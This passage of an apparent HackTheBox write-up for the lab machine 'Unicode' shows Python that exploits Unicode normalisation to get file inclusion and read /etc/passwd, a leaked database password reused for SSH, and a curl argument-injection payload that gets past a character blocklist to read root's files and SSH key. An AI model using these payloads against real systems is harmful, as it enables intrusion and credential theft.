</span></span><span style="display:flex"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://hackmedia.htb/display/?page=</span><span style="color:#e6db74">{</span>encoded_payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, cookies<span style="color:#f92672">=</span>{
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;auth&#34;</span>: <span style="color:#e6db74">&#34;&lt;JWT&gt;&#34;</span>,
</span></span><span style="display:flex"><span>    })
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">not</span> res<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;&lt;html&#34;</span>)
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#75715e"># We will try to get some unicode chars that are valid for ./monthly.pdf</span>
</span></span><span style="display:flex"><span><span style="color:#75715e"># First for /</span>
</span></span><span style="display:flex"><span><span style="color:#75715e"># https://www.compart.com/en/unicode/U+002F</span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u2100</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u2101</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u2105</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u2106</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\uFF0F</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u002F</span><span style="color:#e6db74">&#34;</span>]:
</span></span><span style="display:flex"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./monthly.pdf&#34;</span>
</span></span><span style="display:flex"><span>    worked <span style="color:#f92672">=</span> send_payload(payload, <span style="color:#66d9ef">lambda</span> s: s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;/&#39;</span>, r))
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> worked:
</span></span><span style="display:flex"><span>        print(<span style="color:#e6db74">&#39;/ =&gt;&#39;</span>, r<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;raw_unicode_escape&#39;</span>))
</span></span></code></pre></div><p>We can see the unicode equivalent codes using this page:</p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://www.compart.com/en/unicode/U+002F"><div><div class="bookmark-title">Unicode</div><div class="bookmark-description">U+002F is the unicode hex value of the character Solidus. Char U+002F, Encodings, HTML Entitys:&amp;#47;,&amp;#x2F;,&amp;sol;, UTF-8 (hex), UTF-16 (hex), UTF-32 (hex)</div><div class="bookmark-link"><div>https://www.compart.com/en/unicode/U+002F</div></div></div><div class="bookmark-image"><img src="https://www.compart.com/en/unicode/images/icon/icon-compart.svg" alt="" loading="lazy"/></div></a></div>After this, I updated the script to use the two unicode codes found to
encode the payload:<p></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_unicode_str</span>(s):
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\uff0f</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u2024</span><span style="color:#e6db74">&#39;</span>)
</span></span></code></pre></div><p>And try to reach <code>/etc/passwd</code> to prove if we can do the LFI.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span>send_payload(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>)
</span></span><span style="display:flex"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">15</span>):
</span></span><span style="display:flex"><span>    send_payload(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;../&#39;</span><span style="color:#f92672">*</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">etc/passwd&#34;</span>)
</span></span></code></pre></div><p>Indeed, we got <code>/etc/passwd</code> going back 4 folders.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sending payload: ../../../../etc/passwd
</span></span><span style="display:flex"><span>encoded: ‚Ä§‚Ä§Ôºè‚Ä§‚Ä§Ôºè‚Ä§‚Ä§Ôºè‚Ä§‚Ä§ÔºèetcÔºèpasswd
</span></span><span style="display:flex"><span>root‚ùå0:0:root:/root:/bin/bash
</span></span><span style="display:flex"><span>...
</span></span><span style="display:flex"><span>www-data‚ùå33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex"><span>backup‚ùå34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex"><span>...
</span></span><span style="display:flex"><span>code‚ùå1000:1000:,,,:/home/code:/bin/bash
</span></span></code></pre></div><p>We can see the two users with login rights (root and code), and also
www-data and backup, which seems interesting.</p><h1 id="getting-the-user-flag">Getting the user flag<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-user-flag">#</a></h1><p>We can try to list files, such as the config for <code>nginx</code> at
<code>/etc/nginx/nginx.conf</code>.</p><p>After a lot of time looking for files, I got a hit with <code>../wsgi.py</code> as
it is a common configuration when using Flask + Nginx.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#f92672">from</span> coder <span style="color:#f92672">import</span> app
</span></span><span style="display:flex"><span><span style="color:#f92672">from</span> werkzeug.debug <span style="color:#f92672">import</span> DebuggedApplication
</span></span><span style="display:flex"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex"><span>    app<span style="color:#f92672">.</span>run()
</span></span></code></pre></div><p></p><div class="callout"><span class="callout-emoji">ü§î</span><div class="callout-inner"><p>I could have simply looked for <code>/etc/nginx/sites-enabled/default</code>
which gave a straightforward way to find the sources.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="display:flex"><span><span style="color:#ae81ff">server{</span>
</span></span><span style="display:flex"><span><span style="color:#75715e">#Change the Webroot from /home/code/coder/ to /var/www/html/</span>
</span></span><span style="display:flex"><span><span style="color:#75715e">#change the user password from db.yaml</span>
</span></span><span style="display:flex"><span>        <span style="color:#ae81ff">listen 80;</span>
</span></span><span style="display:flex"><span>        <span style="color:#ae81ff">location / {</span>
</span></span><span style="display:flex"><span>                <span style="color:#ae81ff">proxy_pass http://localhost:8000;</span>
</span></span><span style="display:flex"><span>                <span style="color:#ae81ff">include /etc/nginx/proxy_params;</span>
</span></span><span style="display:flex"><span>                <span style="color:#ae81ff">proxy_redirect off;</span>
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>        <span style="color:#ae81ff">location /static/{</span>
</span></span><span style="display:flex"><span>                <span style="color:#ae81ff">alias /home/code/coder/static/styles/;</span>
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div></div></div>So we can now get the code of the app by reading <code>../coder.py</code>.<p></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex"><span>db<span style="color:#f92672">=</span>yaml<span style="color:#f92672">.</span>load(open(<span style="color:#e6db74">&#39;db.yaml&#39;</span>))
</span></span><span style="display:flex"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;MYSQL_HOST&#39;</span>]<span style="color:#f92672">=</span> db[<span style="color:#e6db74">&#39;mysql_host&#39;</span>]
</span></span><span style="display:flex"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;MYSQL_USER&#39;</span>]<span style="color:#f92672">=</span>db[<span style="color:#e6db74">&#39;mysql_user&#39;</span>]
</span></span><span style="display:flex"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;MYSQL_PASSWORD&#39;</span>]<span style="color:#f92672">=</span>db[<span style="color:#e6db74">&#39;mysql_password&#39;</span>]
</span></span><span style="display:flex"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;MYSQL_DB&#39;</span>]<span style="color:#f92672">=</span>db[<span style="color:#e6db74">&#39;mysql_db&#39;</span>]
</span></span><span style="display:flex"><span>app<span style="color:#f92672">.</span>debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">...</span>
</span></span></code></pre></div><p>So we will try the <code>db.yaml</code>, and get some credentials of user code.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="display:flex"><span><span style="color:#f92672">mysql_host</span>: <span style="color:#e6db74">&#34;localhost&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">mysql_user</span>: <span style="color:#e6db74">&#34;code&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">mysql_password</span>: <span style="color:#e6db74">&#34;B3stC0d3r2021@@!&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">mysql_db</span>: <span style="color:#e6db74">&#34;user&#34;</span>
</span></span></code></pre></div><p>Login with the credentials we got.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh coder@hackmedia.htb
</span></span><span style="display:flex"><span>Password: B3stC0d3r2021@@!
</span></span></code></pre></div><p>And we are in! We can get the <strong>user flag</strong> now if you haven‚Äôt done it
with the LFI.</p><h1 id="privilege-escalation">Privilege escalation<a hidden="" class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1><p>If we list the executables we can sudo without password:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>code@code:~$ sudo -l
</span></span><span style="display:flex"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> code on code:
</span></span><span style="display:flex"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>User code may run the following commands on code:
</span></span><span style="display:flex"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/treport
</span></span></code></pre></div><p>We find a <code>treport</code> executable which is owned by root.</p><p>If we try to find the source:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>find / -name <span style="color:#e6db74">&#39;*treport*&#39;</span> 2&gt;/dev/null
</span></span></code></pre></div><p>we don‚Äôt get any result:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/usr/bin/treport</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/usr/lib/python3/dist-packages/twisted/trial/_dist/test/test_distreporter.py</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/usr/lib/python3/dist-packages/twisted/trial/_dist/test/__pycache__/test_distreporter.cpython-38.pyc</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/usr/lib/python3/dist-packages/twisted/trial/_dist/__pycache__/distreporter.cpython-38.pyc</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/usr/lib/python3/dist-packages/twisted/trial/_dist/distreporter.py</span>
</span></span></code></pre></div><p>And it is a binary file, not a script. If we <code>strings</code> it, it looks like
a python compiled file. We can download it using <code>scp</code>.</p><p>To decompile it, we can try with this two repositories:</p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://github.com/extremecoders-re/pyinstxtractor"><div><div class="bookmark-title">GitHub - extremecoders-re/pyinstxtractor: PyInstaller Extractor</div><div class="bookmark-description">PyInstaller Extractor. Contribute to extremecoders-re/pyinstxtractor development by creating an account on GitHub.</div><div class="bookmark-link"><div>https://github.com/extremecoders-re/pyinstxtractor</div></div></div><div class="bookmark-image"><img src="https://opengraph.githubassets.com/fe2dc1ac4d97403b77c2aeafdc3f52a114882ac54e093bd97c3443e2ae812d60/extremecoders-re/pyinstxtractor" alt="" loading="lazy"/></div></a></div><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://github.com/rocky/python-decompile3"><div><div class="bookmark-title">GitHub - rocky/python-decompile3: Python decompiler for 3.7-3.8 Stripped down from uncompyle6 so we can refactor and start to fix up some long-standing problems</div><div class="bookmark-description">Python decompiler for 3.7-3.8 Stripped down from uncompyle6 so we can refactor and start to fix up some long-standing problems - rocky/python-decompile3</div><div class="bookmark-link"><div>https://github.com/rocky/python-decompile3</div></div></div><div class="bookmark-image"><img src="https://opengraph.githubassets.com/e32b6a689267045130ef564ae2416c74381304ae7894a39931ae6d8f7a48da72/rocky/python-decompile3" alt="" loading="lazy"/></div></a></div><div class="callout"><span class="callout-emoji">‚ö†Ô∏è</span><div class="callout-inner"><p>Make sure you are extracting with <code>python 3.8</code> as the libraries of the binary were using
this version. <code>decompile3</code> wont work if you are not using the same
version as the binary.</p></div></div>After so much trying, I managed to decompile it.<p></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download</span>(self):
</span></span><span style="display:flex"><span>    now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>now()
</span></span><span style="display:flex"><span>    current_time <span style="color:#f92672">=</span> now<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#39;%H_%M_%S&#39;</span>)
</span></span><span style="display:flex"><span>    command_injection_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#e6db74">&#39;||&#39;</span>, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#e6db74">&#39;#&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;%&#39;</span>, <span style="color:#e6db74">&#39;^&#39;</span>, <span style="color:#e6db74">&#39;(&#39;</span>, <span style="color:#e6db74">&#39;)&#39;</span>]
</span></span><span style="display:flex"><span>    ip <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;Enter the IP/file_name:&#39;</span>)
</span></span><span style="display:flex"><span>    res <span style="color:#f92672">=</span> bool(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">s&#39;</span>, ip))
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> res:
</span></span><span style="display:flex"><span>        print(<span style="color:#e6db74">&#39;INVALID IP&#39;</span>)
</span></span><span style="display:flex"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;file&#39;</span> <span style="color:#f92672">in</span> ip <span style="color:#f92672">or</span> (<span style="color:#e6db74">&#39;gopher&#39;</span> <span style="color:#f92672">in</span> ip <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;mysql&#39;</span> <span style="color:#f92672">in</span> ip):
</span></span><span style="display:flex"><span>        print(<span style="color:#e6db74">&#39;INVALID URL&#39;</span>)
</span></span><span style="display:flex"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">for</span> vars <span style="color:#f92672">in</span> command_injection_list:
</span></span><span style="display:flex"><span>        <span style="color:#66d9ef">if</span> vars <span style="color:#f92672">in</span> ip:
</span></span><span style="display:flex"><span>            print(<span style="color:#e6db74">&#39;NOT ALLOWED&#39;</span>)
</span></span><span style="display:flex"><span>            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/bin/bash -c &#34;curl &#39;</span> <span style="color:#f92672">+</span> ip <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; -o /root/reports/threat_report_&#39;</span> <span style="color:#f92672">+</span> current_time <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span>
</span></span><span style="display:flex"><span>        os<span style="color:#f92672">.</span>system(cmd)
</span></span></code></pre></div><p>There seems to be a vulnerable call which simply concatenates the <code>ip</code>,
which is a user input; but there are many characters excluded.</p><p>After some time trying out escapes and different techniques, I gave up
trying to bypass the <code>command_injection_list</code>. I simply read the args of
<code>curl</code> and saw a <code>--next</code> which is kind of weird.</p><blockquote><p>‚Äìnext Make next URL use its separate set of options</p></blockquote><p>This means if we insert the <code>next</code> arg, the second part of the <code>curl</code>
won‚Äôt be executed for the first URL (the only one that exists). With
this in mind, and applying some escapes mentioned before, we can end up
with an expression like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span>{<span style="color:#a6e22e">fi</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">le</span><span style="color:#f92672">:</span><span style="color:#75715e">///etc/passwd,--next}
</span></span></span></code></pre></div><p>The techniques applied are the following:</p><ul><li><code>file</code> is split in two to bypass the <code>INVALID URL</code> restriction using
the escape of a common letter (which results in the letter).</li><li><code>{a,b}</code> syntax allows us to separate two command parts without using
spaces.</li></ul><p>With this we have some way to read files with root privileges. We can
simply get the <strong>root flag</strong> with:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span>{<span style="color:#a6e22e">fi</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">le</span><span style="color:#f92672">:</span><span style="color:#75715e">///root/root.txt,--next}
</span></span></span></code></pre></div><p>Or the ssh key (although it is not working):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span>{<span style="color:#a6e22e">fi</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">le</span><span style="color:#f92672">:</span><span style="color:#75715e">///root/.ssh/id_rsa,--next}
</span></span></span></code></pre></div><h1 id="references">References<a hidden="" class="anchor" aria-hidden="true" href="#references">#</a></h1><ul><li><code>jku</code> claim exploit<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c"><div><div class="bookmark-title">Hacking JWT Tokens: jku Claim Misuse</div><div class="bookmark-description">Hello all, today we will be looking at another interesting way of hacking JWT Tokens via the (ab)using the jku claim and leveraging it to‚Ä¶</div><div class="bookmark-link"><div>https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c</div></div></div><div class="bookmark-image"><img src="https://miro.medium.com/v2/da:true/resize:fit:766/0*7Ck7LtWH8Ae_sQPi" alt="" loading="lazy"/></div></a></div></li><li><code>n</code> and <code>e</code> specification<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://www.rfc-editor.org/rfc/rfc7518#section-6.3.1.1"><div><div class="bookmark-title">RFC 7518: JSON Web Algorithms (JWA)</div><div class="bookmark-description"></div><div class="bookmark-link"><div>https://www.rfc-editor.org/rfc/rfc7518#section-6.3.1.1</div></div></div><div class="bookmark-image"></div></a></div></li><li>How to decompile <code>Pyinstaller</code> binaries<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href=""><div><div class="bookmark-title">{map[img: title: url:] Page(/blog/hackthebox_writeup:_unicode.md) &lt;nil&gt; bookmark true 9 {0 {0 0}} {0 {0 0}} 16305 { 0 0 0} &lt;nil&gt;}</div><div class="bookmark-description"></div><div class="bookmark-link"></div></div><div class="bookmark-image"></div></a></div></li><li>Python decompilation for ELF<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://reverseengineering.stackexchange.com/questions/19900/decompile-python-for-elf-binaries"><div><div class="bookmark-title">Decompile Python for ELF Binaries</div><div class="bookmark-description">There are several solutions available to extract Pyc files from Windows binaries and then decompile them using uncompyle2 or uncompyle6.
However, I have a Linux ELF 64-bit binary which was compiled</div><div class="bookmark-link"><div>https://reverseengineering.stackexchange.com/questions/19900/decompile-python-for-elf-binaries</div></div></div><div class="bookmark-image"><img src="https://cdn.sstatic.net/Sites/reverseengineering/Img/apple-touch-icon@2.png?v=5a6ef1bcd2c8" alt="" loading="lazy"/></div></a></div></li></ul></div><footer class="post-footer"><ul class="post-tags"><li><a href="https://xzebra.dev/tags/cybersecurity/">cybersecurity</a></li><li><a href="https://xzebra.dev/tags/ctf/">ctf</a></li><li><a href="https://xzebra.dev/tags/linux/">linux</a></li><li><a href="https://xzebra.dev/tags/hackthebox/">hackthebox</a></li></ul><div class="share-buttons"><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Unicode on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Writeup%3a%20Unicode&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_unicode%2f&amp;hashtags=cybersecurity%2cctf%2clinux%2chackthebox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Unicode on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_unicode%2f&amp;title=HackTheBox%20Writeup%3a%20Unicode&amp;summary=HackTheBox%20Writeup%3a%20Unicode&amp;source=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_unicode%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Unicode on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_unicode%2f&amp;title=HackTheBox%20Writeup%3a%20Unicode"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Unicode on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_unicode%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Unicode on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Writeup%3a%20Unicode%20-%20https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_unicode%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 